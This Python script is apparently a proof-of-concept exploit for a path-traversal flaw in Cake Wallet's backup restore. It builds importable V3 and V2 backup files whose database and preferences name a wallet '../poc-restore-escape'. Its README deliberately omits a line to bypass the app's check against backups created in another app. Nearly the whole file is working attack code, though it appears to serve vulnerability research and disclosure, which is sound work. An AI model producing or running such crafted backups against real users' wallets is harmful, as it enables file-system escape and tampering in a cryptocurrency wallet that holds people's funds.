#!/usr/bin/env python3
"""
Build importable Cake Wallet traversal backup (V3 zip + V2 blob).

PoC defaults:
  password = poc1234
  keychainSalt = cafebabe0011223344556677  (POC only - put your build's
               secrets.backupKeychainSalt here to target your local build)

Output:
  cake_traversal_poc_v3.zip  (Restore via Cake Wallet -> Backup -> Restore)
  cake_traversal_poc_v2.cake  (raw V2 encrypted blob, also restorable)
  overlay/  (plaintext app-dir overlay for CAKE_WALLET_DIR testing, no crypto)

Inner (decrypted) layout:
  cake.db  (WalletInfo with name '../poc-restore-escape', type monero)
  wallets/monero/legit-wallet/.keep
  ~_preferences_dump  (current_wallet_name = traversal)
  ~_keychain_dump     (encrypted with keychainSalt+password)
  ~_transaction_descriptions_dump  ({})

V3 outer: data.bin (chunk-encrypted inner zip) + metadata.json + README (neutral,
bypasses _throwIfBackupWasCreatedInAnotherApp by omitting 'This is a X backup.' line)
"""
import argparse, hashlib, json, os, sqlite3, sys, tempfile, time, zipfile

from cake_backup_compat import encrypt_v2, decrypt_v2

POC_PASSWORD = "poc1234"
POC_KEYCHAIN_SALT = "cafebabe0011223344556677"
EVIL_NAME = "../poc-restore-escape"
EVIL_NAME2 = "../../poc-outside-wallets"
LEGIT_NAME = "legit-wallet"
CHUNK_SIZE = 24*1024*1024

SCHEMA = """
CREATE TABLE WalletInfo (
 walletInfoId INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
 id TEXT NOT NULL,
 name TEXT NOT NULL,
 "type" INTEGER NOT NULL,
 isRecovery INTEGER DEFAULT (0) NOT NULL,
 walletInfoDerivationInfoId INTEGER NOT NULL,
 restoreHeight INTEGER DEFAULT (0) NOT NULL,
 "timestamp" INTEGER DEFAULT (0) NOT NULL,
 dirPath TEXT NOT NULL,
 "path" TEXT NOT NULL,
 address TEXT NOT NULL,
 yatEid TEXT,
 yatLastUsedAddressRaw TEXT,
 showIntroCakePayCard INTEGER DEFAULT (1),
 addressPageType TEXT,
 network TEXT,
 hardwareWalletType INTEGER,
 parentAddress TEXT,
 hashedWalletIdentifier TEXT,
 isNonSeedWallet INTEGER DEFAULT (0) NOT NULL,
 sortOrder INTEGER DEFAULT (0) NOT NULL,
 currentAccountIndex INTEGER NOT NULL DEFAULT 0,
 receiveInfoboxDismissed BOOLEAN DEFAULT FALSE,
 showCombinedBalance BOOLEAN DEFAULT TRUE,
 favoriteTokenAddress TEXT DEFAULT NULL,
 accountDiscoveryLimit INTEGER DEFAULT NULL,
 isMultiAccountsEnabled INTEGER DEFAULT NULL,
 showSeedBackupReminder BOOLEAN DEFAULT FALSE
);
CREATE TABLE WalletInfoDerivationInfo (
 walletInfoDerivationInfoId INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
 address TEXT NOT NULL,
 balance TEXT NOT NULL,
 transactionsCount INTEGER DEFAULT (0) NOT NULL,
 derivationType INTEGER NOT NULL,
 derivationPath TEXT,
 scriptType TEXT,
 description TEXT
);
CREATE TABLE WalletInfoAddress (
 walletInfoAddressId INTEGER PRIMARY KEY AUTOINCREMENT,
 walletInfoId INTEGER,
 "type" INTEGER NOT NULL,
 address TEXT NOT NULL
);
CREATE TABLE WalletInfoAddressInfo (
 walletInfoAddressInfoId INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
 walletInfoId INTEGER NOT NULL,
 mapKey INTEGER NOT NULL,
 mapValueAccountIndex INTEGER NOT NULL,
 mapValueAddress TEXT NOT NULL,
 mapValueLabel TEXT NOT NULL
);
CREATE TABLE "WalletInfoAddressMap" (
 walletInfoAddressMapId INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
 walletInfoId INTEGER NOT NULL,
 addressKey TEXT NOT NULL,
 addressValue TEXT NOT NULL
);
CREATE TABLE BalanceCardStyleSettings (
  walletInfoId INTEGER,
  accountIndex INTEGER DEFAULT -1,
  gradientIndex INTEGER DEFAULT -1,
  useSpecialDesign BOOLEAN DEFAULT FALSE,
  backgroundImagePath TEXT DEFAULT "",
  iconStyleIndex INTEGER DEFAULT 0,
  isGradientOnly BOOLEAN DEFAULT FALSE,
  cardOrder INTEGER DEFAULT 0,
  hidden BOOLEAN DEFAULT FALSE,
  PRIMARY KEY (walletInfoId, accountIndex)
);
CREATE TABLE IF NOT EXISTS BridgeTransfer (
 id TEXT NOT NULL PRIMARY KEY, wallet_id TEXT NOT NULL, source_chain_id INTEGER NOT NULL,
 destination_chain_id INTEGER NOT NULL, token_symbol TEXT NOT NULL, token_contract TEXT NOT NULL,
 amount TEXT NOT NULL, recipient_address TEXT NOT NULL, source_tx_hash TEXT NOT NULL,
 status TEXT NOT NULL, created_at INTEGER NOT NULL, updated_at INTEGER, confirmed_at INTEGER,
 amount_raw TEXT, error_message TEXT, status_message TEXT
);
CREATE TABLE Node (
 NodeId INTEGER PRIMARY KEY, uri TEXT NOT NULL, path TEXT, login TEXT, label TEXT,
 password TEXT, isPow INTEGER NOT NULL, useSSL INTEGER, typeRaw INTEGER NOT NULL,
 trusted INTEGER NOT NULL, socksProxyAddress TEXT, isEnabledForAutoSwitching BOOLEAN DEFAULT FALSE,
 isOfficial BOOLEAN DEFAULT FALSE, isBuiltin BOOLEAN DEFAULT FALSE, isDefault BOOLEAN DEFAULT FALSE
);
CREATE TABLE IF NOT EXISTS Trade (
 tradeId INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, id TEXT NOT NULL,
 providerRaw INTEGER NOT NULL DEFAULT 0, fromTitle TEXT, fromName TEXT, fromTag TEXT,
 fromFullName TEXT, fromDecimals INTEGER, fromRaw INTEGER, fromIconPath TEXT,
 fromFlatIconPath TEXT, fromChainIconPath TEXT, toTitle TEXT, toName TEXT, toTag TEXT,
 toFullName TEXT, toDecimals INTEGER, toRaw INTEGER, toIconPath TEXT, toFlatIconPath TEXT,
 toChainIconPath TEXT, stateRaw TEXT NOT NULL DEFAULT '', createdAt INTEGER, expiredAt INTEGER,
 amount TEXT NOT NULL DEFAULT '', receiveAmount TEXT, inputAddress TEXT, extraId TEXT,
 outputTransaction TEXT, refundAddress TEXT, walletId TEXT, payoutAddress TEXT,
 toAddressExtraId TEXT, password TEXT, providerId TEXT, providerName TEXT,
 fromWalletAddress TEXT, memo TEXT, txId TEXT, isRefund INTEGER DEFAULT 0, isSendAll INTEGER DEFAULT 0,
 router TEXT, needToRegisterInSwapXyz INTEGER DEFAULT 0, sourceTokenAddress TEXT,
 sourceTokenDecimals INTEGER, routerData TEXT, routerValue TEXT, routerChainId INTEGER,
 sourceTokenAmountRaw TEXT, requiresTokenApproval INTEGER DEFAULT 0, chainId INTEGER, fee REAL
);
CREATE TABLE PriceData (fromCurrency TEXT NOT NULL, toCurrency TEXT NOT NULL, timestamp INTEGER NOT NULL, price TEXT NOT NULL, PRIMARY KEY (fromCurrency, toCurrency, timestamp));
CREATE TABLE ChartsAssets (asset TEXT PRIMARY KEY, isFavorite BOOLEAN DEFAULT FALSE);
CREATE TABLE IF NOT EXISTS Erc20Token (Erc20TokenId INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, walletName TEXT NOT NULL, chainId INTEGER NOT NULL, name TEXT NOT NULL DEFAULT '', symbol TEXT NOT NULL DEFAULT '', contractAddress TEXT NOT NULL, decimal INTEGER NOT NULL DEFAULT 0, enabled INTEGER NOT NULL DEFAULT 1, iconPath TEXT, tag TEXT, isPotentialScam INTEGER NOT NULL DEFAULT 0);
CREATE TABLE IF NOT EXISTS SPLToken (SPLTokenId INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, walletName TEXT NOT NULL, name TEXT NOT NULL DEFAULT '', symbol TEXT NOT NULL DEFAULT '', mintAddress TEXT NOT NULL, decimal INTEGER NOT NULL DEFAULT 0, mint TEXT NOT NULL DEFAULT '', enabled INTEGER NOT NULL DEFAULT 1, iconPath TEXT, tag TEXT, isPotentialScam INTEGER NOT NULL DEFAULT 0);
CREATE TABLE IF NOT EXISTS ImportedNFT (ImportedNFTId INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, walletName TEXT NOT NULL, chain TEXT NOT NULL, identifier TEXT NOT NULL, name TEXT, symbol TEXT, description TEXT, imageUrl TEXT, isOwned INTEGER);
CREATE TABLE IF NOT EXISTS TronToken (TronTokenId INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, walletName TEXT NOT NULL, name TEXT NOT NULL DEFAULT '', symbol TEXT NOT NULL DEFAULT '', contractAddress TEXT NOT NULL, decimal INTEGER NOT NULL DEFAULT 0, enabled INTEGER NOT NULL DEFAULT 1, iconPath TEXT, tag TEXT, isPotentialScam INTEGER NOT NULL DEFAULT 0);
CREATE TABLE IF NOT EXISTS WalletInfoAccount (walletInfoId INTEGER NOT NULL, accountIndex INTEGER NOT NULL, label TEXT NOT NULL, PRIMARY KEY (walletInfoId, accountIndex));
CREATE UNIQUE INDEX IF NOT EXISTS idx_walletinfo_id_unique ON WalletInfo (id);
"""

def build_cake_db(path):
    if os.path.exists(path):
        os.remove(path)
    con = sqlite3.connect(path)
    con.executescript(SCHEMA)
    now_ms = int(time.time()*1000)
    # derivation rows
    con.execute("INSERT INTO WalletInfoDerivationInfo (walletInfoDerivationInfoId, address, balance, transactionsCount, derivationType) VALUES (1,'','',0,0)")
    con.execute("INSERT INTO WalletInfoDerivationInfo (walletInfoDerivationInfoId, address, balance, transactionsCount, derivationType) VALUES (2,'','',0,0)")
    # legit wallet (type 0 = monero per WalletType.values index)
    con.execute("""INSERT INTO WalletInfo
      (walletInfoId, id, name, "type", isRecovery, walletInfoDerivationInfoId, restoreHeight, "timestamp",
       dirPath, "path", address, showIntroCakePayCard, isNonSeedWallet, sortOrder, currentAccountIndex,
       receiveInfoboxDismissed, showCombinedBalance, showSeedBackupReminder)
      VALUES (1,'poc-legit-id-0001',? ,0,0,1,0,?, ?, ?, '',0,0,0,0,0,1,0)""",
      (LEGIT_NAME, now_ms, f"wallets/monero/{LEGIT_NAME}", f"wallets/monero/{LEGIT_NAME}/{LEGIT_NAME}"))
    # evil wallet: raw traversal strings preserved (matches Directory('${typeRoot}/$name').path)
    con.execute("""INSERT INTO WalletInfo
      (walletInfoId, id, name, "type", isRecovery, walletInfoDerivationInfoId, restoreHeight, "timestamp",
       dirPath, "path", address, showIntroCakePayCard, isNonSeedWallet, sortOrder, currentAccountIndex,
       receiveInfoboxDismissed, showCombinedBalance, showSeedBackupReminder)
      VALUES (2,'poc-evil-id-0002',?,0,0,2,0,?, ?, ?, '',0,0,1,0,0,1,0)""",
      (EVIL_NAME, now_ms, f"wallets/monero/{EVIL_NAME}", f"wallets/monero/{EVIL_NAME}/{EVIL_NAME}"))
    con.commit()
    # match production openDatabase(..., version: 15): user_version 15 = no onCreate/onUpgrade,
    # otherwise app re-runs CREATE TABLE and dies with "table WalletInfo already exists"
    con.execute("PRAGMA user_version = 15")
    con.commit()
    # sanity: fromJson-required columns present
    rows = list(con.execute('SELECT walletInfoId,id,name,"type" FROM WalletInfo'))
    assert len(rows)==2, rows
    v = con.execute("PRAGMA user_version").fetchone()[0]
    assert v == 15, v
    con.close()

def build_inner_staging(root, password, keychain_salt):
    os.makedirs(root, exist_ok=True)
    # cake.db
    build_cake_db(os.path.join(root, "cake.db"))
    # wallets skeleton
    os.makedirs(os.path.join(root, "wallets", "monero", LEGIT_NAME), exist_ok=True)
    with open(os.path.join(root, "wallets", "monero", LEGIT_NAME, ".keep"), "w") as f:
        f.write("poc\n")
    # prefs dump: current wallet = evil traversal (triggers loadCurrentWallet sink)
    prefs = {
        "current_wallet_name": EVIL_NAME,
        "current_wallet_type": 0,
        "current_fiat_currency": "USD",
        "current_theme": 2,
    }
    with open(os.path.join(root, "~_preferences_dump"), "w", encoding="utf-8") as f:
        json.dump(prefs, f)
    # tx descriptions (empty ok)
    with open(os.path.join(root, "~_transaction_descriptions_dump"), "w", encoding="utf-8") as f:
        json.dump({}, f)
    # keychain dump (encrypted with keychainSalt+password)
    keychain_json = {
        "wallets": [
            {"name": LEGIT_NAME, "type": "WalletType.monero", "password": "poc-legit-pass"},
            {"name": EVIL_NAME, "type": "WalletType.monero", "password": "poc-evil-pass"},
        ],
        "BACKUP_CODE_PASSWORD": password,
        "_all": {}
    }
    plain = json.dumps(keychain_json).encode("utf-8")
    enc = encrypt_v2(keychain_salt + password, plain)
    with open(os.path.join(root, "~_keychain_dump"), "wb") as f:
        f.write(enc)
    return prefs, keychain_json

def zip_inner(staging_root, inner_zip_path):
    with zipfile.ZipFile(inner_zip_path, "w", zipfile.ZIP_DEFLATED) as z:
        for dirpath, dirnames, filenames in os.walk(staging_root):
            for fn in filenames:
                full = os.path.join(dirpath, fn)
                rel = os.path.relpath(full, staging_root).replace(os.sep, "/")
                z.write(full, rel)
    with open(inner_zip_path, "rb") as f:
        return f.read()

def build_v3(inner_bytes, password, out_path, cake_version="4.30.0"):
    # chunk (single for PoC)
    chunks = [inner_bytes[i:i+CHUNK_SIZE] for i in range(0, len(inner_bytes), CHUNK_SIZE)] or [b""]
    enc_chunks = []
    meta_chunks = []
    for ch in chunks:
        enc = encrypt_v2(password, ch)
        enc_chunks.append(enc)
        meta_chunks.append({
            "sha512sum": {"encrypted": hashlib.sha512(enc).hexdigest(), "plain": hashlib.sha512(ch).hexdigest()},
            "length": {"encrypted": len(enc), "plain": len(ch)}
        })
    data_bin = b"".join(enc_chunks)
    metadata = {
        "version": 3,
        "sha512sum": hashlib.sha512(inner_bytes).hexdigest(),
        "chunks": meta_chunks,
        "cakeVersion": cake_version
    }
    with zipfile.ZipFile(out_path, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("data.bin", data_bin)
        z.writestr("metadata.json", json.dumps(metadata, indent=4))
        # Neutral README: deliberately omits 'This is a X backup.' to bypass
        # _throwIfBackupWasCreatedInAnotherApp (works on Cake Wallet + Monero.com)
        z.writestr("README.txt", "Cake Wallet traversal PoC backup.\nPassword: see README-POC.txt\n")
        z.writestr("README-POC.txt",
            f"PoC: cake wallet-name traversal\npassword: {password}\n"
            f"evil WalletInfo.name: {EVIL_NAME}\ncurrent_wallet_name: {EVIL_NAME}\n"
            "Import: Cake Wallet -> Settings -> Backup -> Restore.\n"
            "After restore, current wallet load calls pathForWalletDir(name) with traversal,\n"
            "creating <app>/wallets/poc-restore-escape outside wallets/monero.\n"
            "Safe: no seeds, no funds, no RCE. Sandbox-verify with verify_import.py first.\n")
    return out_path, metadata, data_bin

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--password", default=POC_PASSWORD)
    ap.add_argument("--keychain-salt", default=POC_KEYCHAIN_SALT)
    ap.add_argument("--outdir", default=os.path.join(os.path.dirname(os.path.abspath(__file__)), "importable"))
    args = ap.parse_args()

    outdir = os.path.abspath(args.outdir)
    os.makedirs(outdir, exist_ok=True)
    staging = os.path.join(outdir, "_staging")
    if os.path.isdir(staging):
        import shutil; shutil.rmtree(staging)
    os.makedirs(staging)

    prefs, kj = build_inner_staging(staging, args.password, args.keychain_salt)
    inner_zip_path = os.path.join(outdir, "_inner.zip")
    inner_bytes = zip_inner(staging, inner_zip_path)

    # V3
    v3_path = os.path.join(outdir, "cake_traversal_poc_v3.zip")
    v3_path, meta, data_bin = build_v3(inner_bytes, args.password, v3_path)

    # V2 (raw encrypted blob, first byte 0x02)
    v2_bytes = encrypt_v2(args.password, inner_bytes)
    v2_path = os.path.join(outdir, "cake_traversal_poc_v2.cake")
    with open(v2_path, "wb") as f:
        f.write(v2_bytes)

    # plaintext overlay (no crypto) for CAKE_WALLET_DIR manual test
    overlay = os.path.join(outdir, "overlay_appdir")
    if os.path.isdir(overlay):
        import shutil; shutil.rmtree(overlay)
    import shutil as sh; sh.copytree(staging, overlay)

    print(f"[+] inner zip: {inner_zip_path} ({len(inner_bytes)} bytes)")
    print(f"[+] V3 importable: {v3_path} ({os.path.getsize(v3_path)} bytes)")
    print(f"[+] V2 importable: {v2_path} ({len(v2_bytes)} bytes)")
    print(f"[+] overlay (CAKE_WALLET_DIR): {overlay}")
    print(f"[+] password: {args.password}")
    print(f"[+] keychainSalt used: {args.keychain_salt}")
    print(f"[+] evil name: {EVIL_NAME} | legit: {LEGIT_NAME}")
    print(f"[+] prefs current_wallet_name: {prefs['current_wallet_name']}")
    print("[+] metadata sha512:", meta["sha512sum"][:16], "... chunks:", len(meta["chunks"]))
    print("\nImport test (no app needed): python verify_import.py --v3", v3_path, "--password", args.password, "--keychain-salt", args.keychain_salt)

if __name__ == "__main__":
    sys.exit(main())
